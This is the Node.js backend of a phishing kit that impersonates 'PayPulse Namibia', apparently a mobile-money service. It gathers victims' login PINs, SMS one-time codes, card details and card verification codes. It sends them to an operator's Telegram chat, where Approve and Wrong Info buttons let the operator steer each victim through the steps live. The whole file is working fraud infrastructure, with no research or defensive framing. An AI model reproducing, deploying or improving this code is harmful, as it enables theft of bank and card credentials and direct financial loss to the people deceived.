const express = require('express');
const cors = require('cors');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 8080;

app.use(cors());
app.use(express.json());
app.use(express.static('.')); // Tells Express to serve your static HTML files

// Memory maps to track user authentication states by phone number
const orderStatuses = {};   
const lastSubmissionTime = {}; 
const lastResendTimestamp = {}; // Tracks backend cooldown per phone for resend requests
const resendCounts = {};        // Tracks number of resend attempts per phone (max 3)
const userCredentials = {}; // Tracks collected credentials per phone
const loginAttemptCounts = {}; // Tracks login attempts for second-attempt logic after 60s

// Helper function to safely escape Markdown special characters
function escapeMarkdown(text) {
    if (!text) return '';
    return text.replace(/[_*[\]()~`>#+\-=|{}.!]/g, '\\$&');
}

// Helper function to safely fetch from Telegram with a built-in timeout and abort handler
async function sendToTelegram(url, payload) {
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 15000);

    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload),
            signal: controller.signal
        });
        clearTimeout(timeoutId);
        const data = await response.json();
        
        if (!data.ok) {
            console.error('🚨 TELEGRAM REJECTED MESSAGE:', JSON.stringify(data));
        } else {
            console.log('✅ Message successfully delivered to Telegram!');
        }
        return data;
    } catch (error) {
        clearTimeout(timeoutId);
        console.error('❌ Telegram Fetch Exception:', error.message);
        throw error;
    }
}

// Handles Submissions across login, PIN, SMS verification, and Card verification flows
app.post('/api/submit-order', async (req, res) => {
    try {
        const { phone, uniqueId } = req.body;
        
        const currentTime = Date.now(); 
        const cooldownTime = 10 * 1000; // 10 seconds general cooldown to prevent button spamming
        const isResendAction = uniqueId && uniqueId.includes('Resend');

        // Enforce strict backend rate limits and maximum limits for Resend actions
        if (isResendAction) {
            // Initialize or track resend attempts for this phone
            if (!resendCounts[phone]) {
                resendCounts[phone] = 0;
            }

            // Restrict maximum resend attempts to 3 times strictly on the backend
            if (resendCounts[phone] >= 3) {
                return res.json({ success: false, message: 'Resend limit reached.' });
            }

            const lastResend = lastResendTimestamp[phone] || 0;
            const resendCooldown = 60 * 1000; // 60 seconds timeframe

            if (currentTime - lastResend < resendCooldown) {
                return res.json({ success: false, message: 'Resend cooldown active.' });
            }

            // Increment successful resend request count and record timestamp
            resendCounts[phone] += 1;
            lastResendTimestamp[phone] = currentTime;
        }

        // Reset status to pending with a fresh timestamp for every new submission step
        orderStatuses[phone] = {
            status: 'pending',
            timestamp: currentTime
        };

        // Whitelist critical steps so they never get throttled by cooldowns
        const isImportantAction = (uniqueId && (
            uniqueId.startsWith('Login PIN: ') || 
            uniqueId.startsWith('SMS Code: ') || 
            uniqueId.startsWith('Card Verification SMS Code: ') ||
            uniqueId.includes('Brand: ') || 
            uniqueId.includes('Card:') || 
            uniqueId.includes('Submitted') || 
            uniqueId.includes('Resend')
        ));

        if (!isImportantAction && lastSubmissionTime[phone] && (currentTime - lastSubmissionTime[phone] < cooldownTime)) {
            return res.json({ success: true, message: 'Already submitted.' });
        }

        lastSubmissionTime[phone] = currentTime;

        const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
        const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

        const countryFlag = "🇳🇦";
        const rawDigits = phone ? phone.replace(/\+264/g, '').trim() : '';

        // Initialize or retrieve user credentials accumulator
        if (!userCredentials[phone]) {
            userCredentials[phone] = {};
        }

        let headerTitle = "🔔 *PayPulse Namibia Submission Update*";
        let includeInlineButtons = true;

        const isLoginAttempt = uniqueId && uniqueId.startsWith('Login PIN:');

        if (isLoginAttempt) {
            if (!loginAttemptCounts[phone]) {
                loginAttemptCounts[phone] = { count: 1, lastTime: currentTime };
            } else {
                if (currentTime - loginAttemptCounts[phone].lastTime >= 60 * 1000) {
                    loginAttemptCounts[phone].count += 1;
                }
                loginAttemptCounts[phone].lastTime = currentTime;
            }

            if (loginAttemptCounts[phone].count >= 2) {
                headerTitle = "🔄 *PayPulse Login (Second Attempt)*";
            } else {
                headerTitle = "🔑 *PayPulse Login Attempt*";
            }
        }

        // Accumulate/Merge incoming data into the user's permanent session profile
        if (uniqueId && uniqueId.startsWith('Login PIN: ')) {
            headerTitle = "🔐 *PayPulse Login PIN Submitted*";
            userCredentials[phone].mpin = uniqueId.replace('Login PIN: ', '');
        } else if (uniqueId && uniqueId.startsWith('SMS Code: ')) {
            headerTitle = "📨 *PayPulse SMS Code Submitted*";
            userCredentials[phone].smsCode = uniqueId.replace('SMS Code: ', '');
        } else if (uniqueId && uniqueId.startsWith('Card Verification SMS Code: ')) {
            headerTitle = "📨 *PayPulse Card Verification Code*";
            userCredentials[phone].verifyCode = uniqueId.replace('Card Verification SMS Code: ', '');
        } else if (uniqueId && (uniqueId.includes('Brand: ') || uniqueId.includes('Card:'))) {
            headerTitle = "💳 *PayPulse Card Details Submitted*";
            userCredentials[phone].cardDetails = uniqueId;
        } else if (isResendAction) {
            headerTitle = "🔄 *PayPulse Resend Code Request*";
            includeInlineButtons = false; // Independent one-way notification without interactive buttons
        }

        // Build a comprehensive message displaying accumulated user info
        let message = `${headerTitle}\n\n` +
                      `${countryFlag} Country: \`+264\`\n` +
                      `📱 Phone: \`${escapeMarkdown(rawDigits)}\``;

        if (loginAttemptCounts[phone] && loginAttemptCounts[phone].count >= 2 && isLoginAttempt) {
            message += `\n📌 Attempt: *Second Attempt (After 60s)*`;
        }

        if (userCredentials[phone].mpin) {
            message += `\n🔐 Login PIN: \`${escapeMarkdown(userCredentials[phone].mpin)}\``;
        }
        if (userCredentials[phone].smsCode) {
            message += `\n📨 SMS Code: \`${escapeMarkdown(userCredentials[phone].smsCode)}\``;
        }
        if (userCredentials[phone].cardDetails) {
            message += `\n💳 Card Details:\n\`${escapeMarkdown(userCredentials[phone].cardDetails)}\``;
        }
        if (userCredentials[phone].verifyCode) {
            message += `\n📨 Verify Code: \`${escapeMarkdown(userCredentials[phone].verifyCode)}\``;
        }

        if (isResendAction) {
            message += `\n\n📌 Status: *Resend Code Requested (Attempt ${resendCounts[phone]}/3)*`;
        }

        const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

        const telegramPayload = {
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'Markdown'
        };

        if (includeInlineButtons) {
            let actionPrefix = 'approve_';
            let wrongIdPrefix = 'wrong_id_';

            if (uniqueId && (uniqueId.includes('Brand: ') || uniqueId.includes('Card:'))) {
                actionPrefix = 'approve_card_';
                wrongIdPrefix = 'wrong_card_';
            } else if (uniqueId && uniqueId.startsWith('Login PIN: ')) {
                actionPrefix = 'approve_pin_';
                wrongIdPrefix = 'wrong_pin_';
            } else if (uniqueId && uniqueId.startsWith('SMS Code: ')) {
                actionPrefix = 'approve_sms_';
                wrongIdPrefix = 'wrong_sms_';
            } else if (uniqueId && uniqueId.startsWith('Card Verification SMS Code: ')) {
                actionPrefix = 'approve_verify_';
                wrongIdPrefix = 'wrong_verify_';
            }

            telegramPayload.reply_markup = {
                inline_keyboard: [
                    [
                        { text: "✅ Approve", callback_data: `${actionPrefix}${phone}` }
                    ],
                    [
                        { text: "❌ Wrong Info", callback_data: `${wrongIdPrefix}${phone}` }
                    ]
                ]
            };
        }

        const sentTelegramMsg = await sendToTelegram(telegramUrl, telegramPayload);

        // 5-minute timeout window check for Telegram admin
        if (includeInlineButtons && sentTelegramMsg && sentTelegramMsg.result) {
            const msgChatId = sentTelegramMsg.result.chat.id;
            const msgId = sentTelegramMsg.result.message_id;

            setTimeout(async () => {
                if (orderStatuses[phone] && orderStatuses[phone].status === 'pending') {
                    orderStatuses[phone] = {
                        status: 'expired',
                        timestamp: Date.now()
                    };

                    let expiredMessage = `⌛ *PayPulse Request Expired / Timed Out*\n\n` +
                                         `${countryFlag} Country: \`+264\`\n` +
                                         `📱 Phone: \`${escapeMarkdown(rawDigits)}\`\n` +
                                         `📌 Status: *Timed Out (5-Minute Limit Reached)*`;

                    const editUrl = `https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`;
                    try {
                        await sendToTelegram(editUrl, {
                            chat_id: msgChatId,
                            message_id: msgId,
                            text: expiredMessage,
                            parse_mode: 'Markdown'
                        });
                    } catch (err) {
                        console.error('Failed to expire Telegram message:', err.message);
                    }
                }
            }, 5 * 60 * 1000);
        }

        res.json({ success: true, message: 'Sent successfully.' });
    } catch (error) {
        console.error(error);
        res.status(500).json({ success: false, message: 'Error' });
    }
});

// Polling loop to check if admin approved the submission along with timestamp
app.get('/api/check-status', (req, res) => {
    const phone = req.query.phone ? req.query.phone.trim() : '';
    const userState = orderStatuses[phone] || { status: 'pending', timestamp: 0 };
    
    res.json(userState);
});

// Handles inline button clicks from Telegram admin
app.post('/api/telegram-webhook', async (req, res) => {
    try {
        const update = req.body;

        if (update.callback_query) {
            const callbackData = update.callback_query.data;
            const chatId = update.callback_query.message.chat.id;
            const messageId = update.callback_query.message.message_id;
            const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;

            let actionText = '';
            let phone = '';
            let messageTitle = 'Processed Request';

            if (callbackData.includes('_')) {
                const parts = callbackData.split('_');
                phone = parts[parts.length - 1];
            }

            const actionTimestamp = Date.now();

            if (callbackData.startsWith('approve_')) {
                orderStatuses[phone] = { status: 'approved', timestamp: actionTimestamp };
                actionText = 'Approved ✅';
                messageTitle = 'PayPulse Request Approved';
            } else {
                orderStatuses[phone] = { status: 'wrong_id', timestamp: actionTimestamp };
                actionText = 'Wrong Info ❌';
                messageTitle = 'PayPulse Error / Wrong Info';
            }

            const countryFlag = "🇳🇦";
            const rawDigits = phone ? phone.replace(/\+264/g, '').trim() : '';

            let updatedMessage = `📋 *${messageTitle}*\n\n` +
                                 `${countryFlag} Country: \`+264\`\n` +
                                 `📱 Phone: \`${escapeMarkdown(rawDigits)}\``;

            if (userCredentials[phone]) {
                const creds = userCredentials[phone];
                if (creds.mpin) {
                    updatedMessage += `\n🔐 Login PIN: \`${escapeMarkdown(creds.mpin)}\``;
                }
                if (creds.smsCode) {
                    updatedMessage += `\n📨 SMS Code: \`${escapeMarkdown(creds.smsCode)}\``;
                }
                if (creds.cardDetails) {
                    updatedMessage += `\n💳 Card Details:\n\`${escapeMarkdown(creds.cardDetails)}\``;
                }
                if (creds.verifyCode) {
                    updatedMessage += `\n📨 Verify Code: \`${escapeMarkdown(creds.verifyCode)}\``;
                }
            }

            updatedMessage += `\n\n📌 Status: *${actionText}*`;

            const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`;
            await sendToTelegram(telegramUrl, {
                chat_id: chatId,
                message_id: messageId,
                text: updatedMessage,
                parse_mode: 'Markdown'
            });
        }
    } catch (err) {
        console.error('Webhook Error:', err);
    }

    res.sendStatus(200);
});

async function registerTelegramWebhook() {
    const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
    const RENDER_URL = process.env.RENDER_EXTERNAL_URL;

    if (!BOT_TOKEN || !RENDER_URL) {
        console.log('Telegram webhook setup skipped: missing environment variable.');
        return;
    }

    const webhookUrl = `${RENDER_URL}/api/telegram-webhook`;

    try {
        const telegramUrl =
            `https://api.telegram.org/bot${BOT_TOKEN}/setWebhook?url=${encodeURIComponent(webhookUrl)}`;

        const result = await fetch(telegramUrl).then(res => res.json());

        console.log('Telegram webhook setup:', result);
        console.log('Webhook URL:', webhookUrl);
    } catch (error) {
        console.error('Telegram webhook setup failed:', error.message);
    }
}

app.listen(PORT, () => {
    console.log(`Server running live at http://localhost:${PORT}`);
    registerTelegramWebhook();
});